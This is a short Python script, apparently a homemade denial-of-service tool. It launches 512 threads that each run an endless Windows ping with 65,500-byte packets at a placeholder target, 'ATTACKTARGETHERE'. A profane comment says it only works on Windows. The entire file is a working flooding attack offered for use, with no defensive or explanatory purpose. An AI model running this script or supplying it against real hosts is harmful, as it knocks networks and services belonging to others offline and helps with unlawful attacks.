import os
import threading
def ping():
    os.system(f"ping ATTACKTARGETHERE -t -l 65500")
print(5000*"[]")
for i in range(512):
    thead = threading.Thread(target=ping,name=f'TH{i}')
    thead.start()
#currently only supported on windows, i'm lazy as fuck so fuck off
